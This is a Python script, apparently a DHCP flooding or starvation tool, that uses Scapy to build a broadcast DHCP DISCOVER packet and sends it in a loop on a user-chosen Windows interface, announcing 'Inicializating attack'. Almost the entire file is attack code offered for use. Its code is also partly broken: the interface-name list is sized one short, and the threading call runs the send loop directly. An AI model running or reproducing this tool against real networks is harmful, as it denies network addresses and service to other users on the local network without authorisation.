import signal
import random
import winreg
import netifaces
import threading
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp

def handler(sig,frame): exit(1)
signal.signal(signal.SIGINT, handler)

BANNER = """
▄▄▄█████▓ ██▀███   █    ██   ██████ ▄▄▄█████▓▓█████ ▓█████▄ 
▓  ██▒ ▓▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▒██▀ ██▌
▒ ▓██░ ▒░▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ░██   █▌
░ ▓██▓ ░ ▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ░▓█▄   ▌
  ▒██▒ ░ ░██▓ ▒██▒▒▒█████▓ ▒██████▒▒  ▒██▒ ░ ░▒████▒░▒████▓ 
  ▒ ░░   ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░ ▒▒▓  ▒ 
    ░      ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░    ░     ░ ░  ░ ░ ▒  ▒ 
  ░        ░░   ░  ░░░ ░ ░ ░  ░  ░    ░         ░    ░ ░  ░ 
            ░        ░           ░              ░  ░   ░    
                                                     ░      
                    Created by Dahni
____________________________________________________________
"""

def get_connection_name_from_guid(iface_guids):
    iface_names = ["" for i in range(len(iface_guids) - 1)]
    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    reg_key = winreg.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
    for i in range(len(iface_guids)):
        try:
            reg_subkey = winreg.OpenKey(reg_key, iface_guids[i] + r'\Connection')
            iface_names[i] = winreg.QueryValueEx(reg_subkey, 'Name')[0]
        except FileNotFoundError:
            pass
    return iface_names


def mac_to_bytes(mac_addr: str) -> bytes:
    return int(mac_addr.replace(":", ""), 16).to_bytes(6, "big")

client_mac = "01:02:03:04:05:06"

packet = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src="0.0.0.0", dst="255.255.255.255") /
    UDP(sport=68, dport=67) /
    BOOTP(
        chaddr=mac_to_bytes(client_mac),
        xid=random.randint(1, 2**32-1),
    ) /
    DHCP(options=[("message-type", "discover"), "end"])
)

if __name__ == "__main__":
    print(BANNER)
    interfaces_raw = netifaces.interfaces()
    interfaces = get_connection_name_from_guid(interfaces_raw)
    for words in interfaces: print(f"                > {words}")

    network_interface = input("\n\n[?] Introduce the network interface ~$ ")

    if str(network_interface) in str(interfaces):

        try:
            threads = int(input("[?] How many threads do you want to use? ~$ "))
        except:
            print("[!] That is not a number :(")
            exit(1)

        print("[!] Inicializating attack ... Press ctrl + c to stop it")

        threads_objects = [threading.Thread(target=sendp(packet, iface=network_interface, verbose=False, loop=1)) for x in range(threads)]
        for thread in threads_objects: thread.start()
